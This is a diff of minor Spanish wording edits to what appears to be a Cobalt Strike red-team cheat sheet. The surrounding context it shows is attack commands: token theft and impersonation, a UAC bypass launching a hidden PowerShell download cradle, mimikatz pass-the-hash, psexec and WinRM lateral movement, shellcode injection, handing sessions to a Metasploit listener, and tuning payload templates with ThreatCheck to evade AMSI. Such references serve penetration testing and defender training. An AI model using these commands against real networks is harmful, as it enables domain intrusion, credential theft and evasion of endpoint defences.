@@ -56,13 +56,13 @@ portscan [targets] [ports] [arp|icmp|none] [max connections]
 # Powershell
 # Importar módulo de Powershell
 powershell-import C:\path\to\PowerView.ps1
-powershell &#x3C;just write powershell cmd here>
+powershell &#x3C;solo escribe el cmd de powershell aquí>
 
 # User impersonation
 ## Generación de token con credenciales
 make_token [DOMAIN\user] [password] #Crear token para suplantar a un usuario en la red
 ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
-rev2self # Dejar de usar el token generado con make_token
+rev2self # Deja de usar el token generado con make_token
 ## El uso de make_token genera el evento 4624: Una cuenta se ha iniciado sesión correctamente. Este evento es muy común en un dominio de Windows, pero se puede reducir filtrando por el Tipo de Inicio de Sesión. Como se mencionó anteriormente, utiliza LOGON32_LOGON_NEW_CREDENTIALS que es el tipo 9.
 
 # UAC Bypass
@@ -72,12 +72,12 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ## Robar token de pid
 ## Como make_token pero robando el token de un proceso
-steal_token [pid] # Además, esto es útil para acciones de red, no para acciones locales
+steal_token [pid] # Además, esto es útil para acciones de red, no acciones locales
 ## De la documentación de la API sabemos que este tipo de inicio de sesión "permite al llamador clonar su token actual". Por eso la salida del Beacon dice Impersonated &#x3C;current_username> - está suplantando nuestro propio token clonado.
 ls \\computer_name\c$ # Intenta usar el token generado para acceder a C$ en una computadora
-rev2self # Dejar de usar el token de steal_token
+rev2self # Deja de usar el token de steal_token
 
-## Lanzar proceso con nuevas credenciales
+## Lanzar proceso con nuevas credenciales
 spawnas [domain\username] [password] [listener] #Hazlo desde un directorio con acceso de lectura como: cd C:\
 ## Al igual que make_token, esto generará el evento de Windows 4624: Una cuenta se ha iniciado sesión correctamente, pero con un tipo de inicio de sesión de 2 (LOGON32_LOGON_INTERACTIVE). Detallará el usuario que llama (TargetUserName) y el usuario suplantado (TargetOutboundUserName).
 
@@ -93,7 +93,7 @@ pth [DOMAIN\user] [NTLM hash]
 ## Pass the hash a través de mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
 ## Sin /run, mimikatz genera un cmd.exe, si estás ejecutando como un usuario con Escritorio, verá la shell (si estás ejecutando como SYSTEM, estás bien)
-steal_token &#x3C;pid> #Robar token de proceso creado por mimikatz
+steal_token &#x3C;pid> #Robar token del proceso creado por mimikatz
 
 ## Pass the ticket
 ## Solicitar un ticket
@@ -126,8 +126,8 @@ steal_token &#x3C;pid>
 ## Si se creó un token, se utilizará
 jump [method] [target] [listener]
 ## Métodos:
-## psexec                    x86   Usar un servicio para ejecutar un artefacto de Service EXE
-## psexec64                  x64   Usar un servicio para ejecutar un artefacto de Service EXE
+## psexec                    x86   Usar un servicio para ejecutar un artefacto Service EXE
+## psexec64                  x64   Usar un servicio para ejecutar un artefacto Service EXE
 ## psexec_psh                x86   Usar un servicio para ejecutar una línea de PowerShell
 ## winrm                     x86   Ejecutar un script de PowerShell a través de WinRM
 ## winrm64                   x64   Ejecutar un script de PowerShell a través de WinRM
@@ -153,7 +153,7 @@ msf6 exploit(multi/handler) > exploit -j
 
 ## En cobalt: Listeners > Add y establece el Payload en Foreign HTTP. Establece el Host en 10.10.5.120, el Puerto en 8080 y haz clic en Guardar.
 beacon> spawn metasploit
-## Solo puedes generar sesiones de Meterpreter x86 con el listener extranjero.
+## Solo puedes generar sesiones Meterpreter x86 con el listener extranjero.
 
 # Pass session to Metasploit - Through shellcode injection
 ## En el host de metasploit
@@ -165,7 +165,7 @@ ps
 shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inyectar shellcode de metasploit en un proceso x64
 
 # Pass metasploit session to cobalt strike
-## Genera shellcode de Beacon stageless, ve a Attacks > Packages > Windows Executable (S), selecciona el listener deseado, selecciona Raw como el tipo de salida y selecciona Usar carga útil x64.
+## Genera shellcode Beacon stageless, ve a Attacks > Packages > Windows Executable (S), selecciona el listener deseado, selecciona Raw como el tipo de salida y selecciona Usar carga útil x64.
 ## Usa post/windows/manage/shellcode_inject en metasploit para inyectar el shellcode generado de cobalt strike
 
 
@@ -194,7 +194,7 @@ No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cob
 
 La carpeta ResourceKit contiene las plantillas para las cargas útiles basadas en scripts de Cobalt Strike, incluyendo PowerShell, VBA y HTA.
 
-Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes encontrar qué es lo que el defensor (AMSI en este caso) no acepta y modificarlo:
+Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas puedes encontrar qué es lo que no le gusta al defensor (AMSI en este caso) y modificarlo:
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
